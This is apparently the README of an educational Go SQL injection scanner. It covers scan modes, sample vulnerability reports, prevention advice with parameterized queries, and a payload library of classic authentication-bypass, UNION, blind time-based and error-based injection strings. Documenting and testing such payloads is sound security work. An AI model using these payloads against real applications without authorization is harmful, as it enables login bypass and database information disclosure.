# SQL Injection Tester

A comprehensive SQL injection vulnerability scanner written in Go that tests web applications for various types of SQL injection flaws including authentication bypass, UNION-based, boolean-based blind, time-based blind, and error-based injections.

## 📋 Description

This educational cybersecurity tool automates the detection of SQL injection vulnerabilities by testing web application parameters with various malicious payloads. It supports multiple injection types and provides detailed vulnerability reports.

## ⚠️ CRITICAL LEGAL DISCLAIMER

**IMPORTANT - READ CAREFULLY:**

This tool is for **EDUCATIONAL and AUTHORIZED SECURITY TESTING ONLY**.

### Legal Requirements:
- ✅ **ONLY** test applications you own
- ✅ **OBTAIN WRITTEN PERMISSION** before testing any system
- ✅ **COMPLY** with all applicable laws (CFAA, Computer Misuse Act, etc.)
- ❌ **NEVER** test systems without explicit authorization
- ❌ **UNAUTHORIZED TESTING IS ILLEGAL** and may result in criminal prosecution

### Ethical Use:
- 🎓 Educational purposes in controlled environments
- 🔒 Authorized penetration testing engagements
- 🛡️ Security research with proper authorization
- 📚 Cybersecurity training labs

**The author is not responsible for misuse of this tool.**

## ✨ Features

### 🔍 Injection Detection Types

#### 1. **Syntax Error Testing**
- Single/double quote injection
- Detects unescaped input
- Identifies error-based vulnerabilities

#### 2. **Authentication Bypass**
- Classic OR-based bypasses
- Comment-based injections
- Admin account bypasses
- String comparison attacks

#### 3. **UNION-Based Injection**
- Column enumeration
- Data extraction attempts
- NULL-based testing
- UNION ALL queries

#### 4. **Boolean-Based Blind**
- True/false condition testing
- Logic-based injection
- Blind SQL injection detection
- Response comparison

#### 5. **Time-Based Blind**
- SQL Server WAITFOR delays
- MySQL SLEEP functions
- PostgreSQL pg_sleep
- Timing attack detection

#### 6. **Error-Based Injection**
- Database version extraction
- Error message analysis
- Information disclosure

#### 7. **Stacked Queries**
- Multiple query execution
- Dangerous payload testing
- Command injection attempts

### 📊 Scanning Capabilities
- **20+ Payloads**: Comprehensive injection payload library
- **Pattern Matching**: Detects 15+ SQL error patterns
- **Multiple Methods**: GET and POST request support
- **Time Analysis**: Detects time-based vulnerabilities
- **Response Analysis**: Examines server responses
- **Detailed Reports**: Comprehensive vulnerability reporting

### 🎯 Supported Databases
- MySQL/MariaDB
- PostgreSQL
- Microsoft SQL Server
- Oracle Database
- Generic SQL patterns

## 🚀 Installation

### Prerequisites
- Go 1.16 or higher

### Setup

1. Clone the repository:
```bash
git clone https://github.com/arya2004/cybersecurity.git
cd cybersecurity/sql-injection-tester
```

2. No additional dependencies required (uses Go standard library)

## 💻 Usage

### Interactive Mode
```bash
go run main.go

# Follow the prompts:
# - Enter target URL
# - Enter parameter name
# - Select HTTP method
# - Confirm authorization
```

### Command-Line Mode
```bash
# Basic scan
go run main.go -url http://testsite.com/login -param username -method POST

# GET parameter scan
go run main.go -url http://testsite.com/search?q=test -param q

# Help
go run main.go --help
```

## 📸 Sample Output

### Scanning Process
```
╔═══════════════════════════════════════╗
║   SQL Injection Tester v1.0          ║
║   Cybersecurity Lab Tool              ║
╚═══════════════════════════════════════╝

⚠️  LEGAL DISCLAIMER:
────────────────────────────────────────────────────────────
This tool is for EDUCATIONAL and AUTHORIZED testing ONLY.
────────────────────────────────────────────────────────────

🔍 Scanning URL: http://vulnerable-site.com/login
Parameter: username
Method: POST
────────────────────────────────────────────────────────────
[1/20] Testing: Single quote test (Syntax Error)
  ⚠️  VULNERABLE! SQL Error Pattern: SQL syntax
[2/20] Testing: Classic OR bypass (Authentication Bypass)
  ⚠️  VULNERABLE! SQL Error Pattern: mysql_fetch
[3/20] Testing: Comment-based bypass (Authentication Bypass)
  ✓ No vulnerability detected
...
[20/20] Testing: Update attempt (Stacked Query)
  ✓ No vulnerability detected
────────────────────────────────────────────────────────────
Scan complete: 8 potential vulnerabilities found
```

### Vulnerability Report
```
════════════════════════════════════════════════════════════
SQL INJECTION VULNERABILITY REPORT
════════════════════════════════════════════════════════════
Scan Date: 2024-10-15 14:30:25
Target: http://vulnerable-site.com/login
────────────────────────────────────────────────────────────
SUMMARY:
  Total Tests: 20
  Vulnerabilities Found: 8

Vulnerabilities by Type:
  • Syntax Error: 2
  • Authentication Bypass: 3
  • UNION-Based: 1
  • Boolean-Based: 1
  • Time-Based: 1
────────────────────────────────────────────────────────────

DETAILED FINDINGS:

[1] Syntax Error Injection
  Payload: '
  Indicators:
    • SQL Error Pattern: SQL syntax
  Response Time: 45ms
  Status Code: 200

[2] Authentication Bypass Injection
  Payload: ' OR '1'='1
  Indicators:
    • SQL Error Pattern: mysql_fetch
  Response Time: 52ms
  Status Code: 200

[3] Time-Based Injection
  Payload: '; SELECT SLEEP(5)--
  Indicators:
    • Time delay detected: 5.12s
  Response Time: 5.12s
  Status Code: 200
════════════════════════════════════════════════════════════
```

### Secure Application
```
════════════════════════════════════════════════════════════
SQL INJECTION VULNERABILITY REPORT
════════════════════════════════════════════════════════════
SUMMARY:
  Total Tests: 20
  Vulnerabilities Found: 0

✓ No SQL injection vulnerabilities detected!
The target appears to be protected against SQL injection.
════════════════════════════════════════════════════════════
```

## 🔐 Payload Library

### Syntax Error Tests
```sql
'
"
```

### Authentication Bypass
```sql
' OR '1'='1
' OR 1=1--
admin' --
' OR 'x'='x
') OR ('1'='1
```

### UNION-Based
```sql
' UNION SELECT NULL--
' UNION SELECT 1,2,3--
' UNION ALL SELECT NULL,NULL--
```

### Boolean-Based Blind
```sql
' AND 1=1--
' AND 1=2--
' AND 'a'='a
```

### Time-Based Blind
```sql
'; WAITFOR DELAY '0:0:5'--      (SQL Server)
'; SELECT SLEEP(5)--             (MySQL)
'; pg_sleep(5)--                 (PostgreSQL)
```

### Error-Based
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)y)--
```

## 🎓 Educational Use Cases

### Cybersecurity Training
- SQL injection fundamentals
- Web application security
- Vulnerability assessment
- Penetration testing methodology
- Secure coding practices

### Academic Labs
- Web security courses
- Ethical hacking classes
- Database security
- Application security testing

### Professional Development
- Security auditor training
- Penetration tester certification prep
- Developer security awareness
- Bug bounty preparation

## 🛡️ Prevention & Mitigation

### For Developers
✅ **Use Parameterized Queries** (Prepared Statements)
```go
// Bad - Vulnerable
query := "SELECT * FROM users WHERE username='" + userInput + "'"

// Good - Secure
stmt, _ := db.Prepare("SELECT * FROM users WHERE username=?")
stmt.Query(userInput)
```

✅ **Input Validation**
- Whitelist allowed characters
- Validate data types
- Limit input length
- Sanitize special characters

✅ **Least Privilege**
- Database users with minimal permissions
- No DDL rights for application accounts
- Separate read/write accounts

✅ **Web Application Firewalls (WAF)**
- ModSecurity rules
- Cloud WAF (Cloudflare, AWS WAF)
- Pattern-based blocking

✅ **Error Handling**
- Don't expose database errors to users
- Generic error messages
- Detailed logging server-side only

### Testing Best Practices
✅ Obtain written authorization  
✅ Test in isolated environments  
✅ Use test databases with dummy data  
✅ Document all findings  
✅ Report vulnerabilities responsibly

## 🔧 Customization

### Add Custom Payloads
```go
var sqlPayloads = []SQLInjectionPayload{
    {
        Payload: "YOUR_PAYLOAD_HERE",
        Type: "Custom Type",
        Description: "Description of what it tests",
    },
}
```

### Add Error Patterns
```go
var sqlErrorPatterns = []string{
    "Your custom error pattern",
    "Another pattern to detect",
}
```

### Adjust Timing
```go
// Modify delay between requests (be polite!)
time.Sleep(100 * time.Millisecond)  // Default
time.Sleep(500 * time.Millisecond)  // Slower, more polite
```

## 📊 Detection Methods

### Error-Based Detection
- Searches for SQL error messages in responses
- Identifies database types from errors
- Detects unhandled exceptions

### Time-Based Detection
- Measures response time delays
- Identifies sleep/wait commands
- Compares baseline response times

### Boolean-Based Detection
- Compares response differences
- Analyzes content length variations
- Identifies true/false conditions

### UNION-Based Detection
- Tests column count enumeration
- Checks for successful data extraction
- Validates UNION query syntax

## 🔮 Future Enhancements

Potential additions:
- Automated data extraction
- Database fingerprinting
- XML/JSON output formats
- Integration with Burp Suite
- Custom wordlist support
- Advanced blind injection techniques
- WAF bypass payloads
- Second-order injection testing
- NoSQL injection support
- Reporting in HTML/PDF

## 📊 Performance

### Scan Speed
- ~20 tests per target
- ~100ms delay between requests
- ~5-10 seconds per full scan
- Time-based tests add 5-15 seconds

### Accuracy
- High detection rate for basic injections
- Effective error-based detection
- Reliable time-based detection
- May produce false positives (manual verification recommended)

## 👨‍💻 Author

**Ashvin**
- GitHub: [@ashvin2005](https://github.com/ashvin2005)
- LinkedIn: [ashvin-tiwari](https://linkedin.com/in/ashvin-tiwari)

## 🎃 Hacktoberfest 2025

Created as part of Hacktoberfest 2025 contributions to the Cybersecurity Lab Codes repository.

## 📄 License

MIT License (same as parent repository)

## 🙏 Acknowledgments

- OWASP SQL Injection Guide
- sqlmap project for inspiration
- PortSwigger Web Security Academy
- Cybersecurity research community

## 📚 References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Testing Guide - SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CAPEC-66: SQL Injection](https://capec.mitre.org/data/definitions/66.html)

---

**Test responsibly. Hack ethically. Secure applications.** 🔐💉